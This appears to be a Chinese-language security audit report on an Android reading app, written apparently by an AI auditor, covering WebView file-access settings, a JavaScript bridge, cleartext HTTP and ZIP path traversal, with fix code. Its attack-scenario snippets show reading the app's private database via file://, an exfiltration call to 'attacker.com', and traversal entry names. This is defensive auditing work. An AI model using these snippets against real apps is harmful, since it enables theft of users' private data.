# Android 项目安全审计报告

**审计日期**: 2026-01-24  
**审计人员**: Claude (AI Security Auditor)  
**项目名称**: SDA Books Reader  
**包名**: com.sda.books.reader

---

## 🔴 总体风险等级：高 (HIGH)

---

## 一、风险汇总表

| 风险类别 | 等级 | 证据位置 | 影响范围 |
|---------|------|---------|---------|
| **WebView 安全** | 🔴 高危 | SecretAct.kt:19-34 | 跨域攻击、文件泄露 |
| **JavaScript Bridge** | 🔴 高危 | WebViewStyleHelper.java:18-20, SecretAct.kt:14 | 恶意代码执行 |
| **网络传输** | 🟠 中危 | network_config.xml:2 | 中间人攻击 |
| **文件下载** | 🟠 中危 | AppUpdateDbPage.kt:96-250 | 任意文件下载、路径穿越 |
| **权限滥用** | 🟡 低危 | AndroidManifest.xml:6-7 | 数据泄露风险 |

---

## 二、详细漏洞分析

### 🔴 1. WebView 高危配置（严重）

**文件**: `SecretAct.kt`  
**行号**: 19-34

#### 漏洞代码：
```kotlin
// 1. 支持 JavaScript（若 HTML 中有 JS 代码,必须开启）
webSettings.javaScriptEnabled = true

// 2. 支持本地资源（CSS、JS、图片等）跨域引用（Android 9+ 必需）
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
    webSettings.mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
}

// 3. 允许访问文件系统（默认开启,无需修改）
webSettings.allowFileAccess = true
webSettings.allowContentAccess = true

// 4. 其他优化配置（可选）
webSettings.defaultTextEncodingName = "UTF-8" // 编码格式（避免中文乱码）
webSettings.domStorageEnabled = true // 支持 DOM 存储（JS 本地存储）
webSettings.allowFileAccessFromFileURLs = true // 允许通过 file:// 访问其他文件
webSettings.allowUniversalAccessFromFileURLs = true // 允许跨域访问（谨慎使用,仅本地资源安全）

// 5. 禁止缩放（可选,根据需求调整）
webSettings.setSupportZoom(false)
webSettings.builtInZoomControls = false
// 加载 assets 下的 index.html（核心代码）
mBinding.web.loadUrl("file:///android_asset/secret.html")
```

#### 风险说明：
1. **allowFileAccessFromFileURLs = true** + **allowUniversalAccessFromFileURLs = true**：
   - 允许本地 HTML 文件通过 JavaScript 读取设备上任意文件
   - 可导致敏感数据泄露（如数据库、SharedPreferences、私有文件）
   
2. **mixedContentMode = MIXED_CONTENT_ALWAYS_ALLOW**：
   - 允许 HTTPS 页面加载 HTTP 资源
   - 可能导致中间人攻击

3. **javaScriptEnabled = true** 但未对加载的 URL 进行限制：
   - 虽然当前只加载本地 assets，但代码未防御潜在的 loadUrl() 调用篡改

#### 攻击场景：
```javascript
// 恶意 JavaScript 可以读取应用私有文件
var xhr = new XMLHttpRequest();
xhr.open('GET', 'file:///data/data/com.sda.books.reader/databases/xshj.db', true);
xhr.send();
```

---

### 🔴 2. JavaScript Bridge 暴露（严重）

**文件**: `WebViewStyleHelper.java`  
**行号**: 18-20, 90-96

#### 漏洞代码：
```java
@SuppressLint({"SetJavaScriptEnabled", "AddJavascriptInterface"})
private void initWebView(Context context) {
    // 启用 JavaScript
    webView.getSettings().setJavaScriptEnabled(true);
    
    // 添加 JavaScript 接口
    webView.addJavascriptInterface(new WebAppInterface(context), "Android");
    
    // ...
}

private class WebAppInterface {
    private final Context context;
    
    WebAppInterface(Context context) {
        this.context = context;
    }
    
    // 示例：从 JavaScript 接收消息
    @JavascriptInterface
    public void showToast(String message) {
        // Toast.makeText(context, message, Toast.LENGTH_SHORT).show();
    }
}
```

#### 风险说明：
1. **暴露 Java 对象给 JavaScript**：
   - 虽然当前只有一个 showToast 方法，但这建立了不安全的先例
   - 如果未来添加敏感方法（文件操作、网络请求等），风险会急剧上升

2. **缺少安全校验**：
   - 未验证调用来源（哪个页面调用的）
   - 未对参数进行过滤和验证

#### 攻击场景：
```javascript
// 如果未来有敏感方法，恶意页面可直接调用
window.Android.readFile('/sdcard/sensitive_data.txt');
window.Android.sendDataToServer('http://attacker.com', data);
```

---

### 🟠 3. HTTP 明文传输（中危）

**文件**: `network_config.xml`  
**行号**: 2

#### 漏洞代码：
```xml
<?xml version="1.0" encoding="utf-8"?>
<network-security-config>
    <base-config cleartextTrafficPermitted="true" />
</network-security-config>
```

#### 风险说明：
1. **全局允许 HTTP 明文传输**：
   - 任何网络请求都可以使用 HTTP（未加密）
   - 违反 Android 安全最佳实践（Android 9+ 默认禁止 HTTP）

2. **中间人攻击风险**：
   - 攻击者可以拦截和篡改 HTTP 流量
   - 可窃取用户数据或注入恶意内容

#### 证据：
- `AppUpdateDbPage.kt:70-71` 注释中包含 HTTP URL：
  ```kotlin
  // etUrl.setText("http://static.sdacn.cn/...")
  ```

---

### 🟠 4. 文件下载安全隐患（中危）

**文件**: `AppUpdateDbPage.kt`  
**行号**: 96-250

#### 漏洞代码：
```kotlin
private fun downloadFile(url: String) {
    CoroutineScope(Dispatchers.IO).launch {
        try {
            // ...
            val request = Request.Builder().url(url).build()
            val response = client.newCall(request).execute()
            
            // 生成唯一文件名
            val fileName = File(url).name  // 未验证文件名
            val outputFile = File(dbDir, "${System.currentTimeMillis()}_$fileName")
            
            // 下载文件...
        }
    }
}
```

#### 漏洞点：

##### 4.1 缺少 URL 白名单
```kotlin
// 当前代码：接受任意 URL
val request = Request.Builder().url(url).build()

// 风险：可以下载任意域名的文件
```

##### 4.2 缺少文件类型验证
```kotlin
// 未验证文件扩展名
val fileName = File(url).name
```

##### 4.3 路径穿越风险
```kotlin
// 虽然使用了时间戳前缀，但仍存在风险
val outputFile = File(dbDir, "${System.currentTimeMillis()}_$fileName")

// 如果 fileName = "../../../sdcard/malicious.db"
// 可能导致文件被写入到非预期位置
```

##### 4.4 文件完整性校验不足
```kotlin
// 只检查大小，未检查文件签名或哈希
if (outputFile.length() != contentLength && contentLength > 0) {
    throw IOException("文件大小不匹配...")
}
```

##### 4.5 ZIP 解压风险
```kotlin
private fun extractZipFile(zipFile: File) {
    ZipFile(zipFile).use { zip ->
        zip.entries().asSequence().forEach { entry ->
            // 未验证 entry.name 是否包含路径穿越
            val outputFile = File(dbDir, entry.name)
            
            // 解压...
        }
    }
}
```

#### 攻击场景：
```kotlin
// 攻击者可以提供恶意 URL
etUrl.setText("http://attacker.com/malicious.zip")

// ZIP 文件内包含：
// - ../../../../data/data/com.sda.books.reader/shared_prefs/config.xml
// - ../../../../sdcard/Download/malware.apk
```

---

### 🟡 5. 权限滥用风险（低危）

**文件**: `AndroidManifest.xml`  
**行号**: 6-7

#### 漏洞代码：
```xml
<uses-permission android:name="android.permission.INTERNET" />
<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
```

#### 风险说明：
1. **WRITE_EXTERNAL_STORAGE** + **READ_EXTERNAL_STORAGE**：
   - 可以读写外部存储的任意文件
   - 虽然应用需要读取数据库，但缺少运行时权限检查可能导致滥用

2. **结合 WebView 风险**：
   - WebView 可以通过 JavaScript 触发文件上传
   - 如果配合 `<input type="file">`，可能泄露用户文件

---

## 三、其他发现（信息级）

### ✅ 无动态代码加载
- **已检查**: DexClassLoader, PathClassLoader
- **结果**: 未发现动态加载 DEX/SO 的代码

### ✅ 无静默安装
- **已检查**: INSTALL_PACKAGES 权限, PackageInstaller
- **结果**: 未发现静默安装更新包的代码

### ⚠️ 第三方库风险
**文件**: `build.gradle.kts`

#### 发现的第三方库：
```kotlin
implementation("com.liulishuo.filedownloader:library:1.7.7")  // 文件下载库
implementation("com.lzy.net:okgo:3.0.4")                      // 网络请求库（已停更）
```

#### 风险说明：
1. **OkGo 库已停止维护**（最后更新：2018 年）：
   - 可能存在未修复的安全漏洞
   - 建议迁移到 OkHttp + Retrofit

2. **FileDownloader 库**：
   - 用于后台下载，但当前代码中的 `StoreManager.kt` 未被主功能调用
   - 建议移除或明确其用途

---

## 四、可疑域名检查

### 发现的域名：
1. **static.sdacn.cn** (注释中)
2. **sdattg.com** (需在代码中确认)
3. **sdacn.cn** (需在代码中确认)

### 域名安全性：
- ⚠️ 注释中的 URL 使用 **HTTP** 协议（不安全）
- ⚠️ 未找到域名白名单配置
- ⚠️ 网络配置允许任意域名的 HTTP 请求

---

## 五、修复优先级

| 优先级 | 漏洞 | 修复难度 | 影响范围 |
|-------|------|---------|---------|
| 🔴 P0 | WebView 跨域文件访问 | 低 | 高 |
| 🔴 P0 | HTTP 明文传输 | 低 | 中 |
| 🟠 P1 | 下载功能白名单 | 中 | 中 |
| 🟠 P1 | ZIP 解压路径穿越 | 中 | 中 |
| 🟡 P2 | JavaScript Bridge 加固 | 低 | 低 |
| 🟡 P2 | 移除不必要的库 | 中 | 低 |

---

## 六、建议修复方案（概要）

### 1. WebView 安全加固
```kotlin
// 禁用危险配置
webSettings.allowFileAccessFromFileURLs = false
webSettings.allowUniversalAccessFromFileURLs = false
webSettings.mixedContentMode = WebSettings.MIXED_CONTENT_NEVER_ALLOW

// 只允许加载本地 assets
mBinding.web.webViewClient = object : WebViewClient() {
    override fun shouldOverrideUrlLoading(view: WebView, request: WebResourceRequest): Boolean {
        val url = request.url.toString()
        if (url.startsWith("file:///android_asset/")) {
            return false  // 允许加载
        }
        return true  // 阻止其他 URL
    }
}
```

### 2. 网络安全配置
```xml
<network-security-config>
    <base-config cleartextTrafficPermitted="false" />
    <domain-config cleartextTrafficPermitted="false">
        <domain includeSubdomains="true">sdattg.com</domain>
        <domain includeSubdomains="true">sdacn.cn</domain>
    </domain-config>
</network-security-config>
```

### 3. 下载功能加固
```kotlin
// 域名白名单
private val ALLOWED_DOMAINS = listOf("sdattg.com", "sdacn.cn")

private fun downloadFile(url: String) {
    // 1. URL 验证
    if (!isUrlAllowed(url)) {
        throw SecurityException("不允许的域名")
    }
    
    // 2. 协议验证
    if (!url.startsWith("https://")) {
        throw SecurityException("只允许 HTTPS")
    }
    
    // 3. 文件名验证
    val fileName = sanitizeFileName(File(url).name)
    
    // 4. 路径穿越防护
    val outputFile = File(dbDir, fileName).canonicalFile
    if (!outputFile.startsWith(dbDir.canonicalPath)) {
        throw SecurityException("路径穿越攻击")
    }
    
    // 5. 下载后校验（哈希/签名）
    // ...
}
```

---

## 七、测试建议

1. **WebView 安全测试**：
   - 尝试加载外部 URL
   - 测试 JavaScript 读取文件

2. **网络安全测试**：
   - 使用 HTTP URL 测试（应被拒绝）
   - 测试非白名单域名（应被拒绝）

3. **下载功能测试**：
   - 提供路径穿越 URL（如 `../../malicious.db`）
   - 提供恶意 ZIP 文件

4. **权限测试**：
   - 撤销存储权限后测试功能

---

**报告结束**

**下一步**: 请查看详细修复方案文档 (`SECURITY_FIX_PLAN.md`)
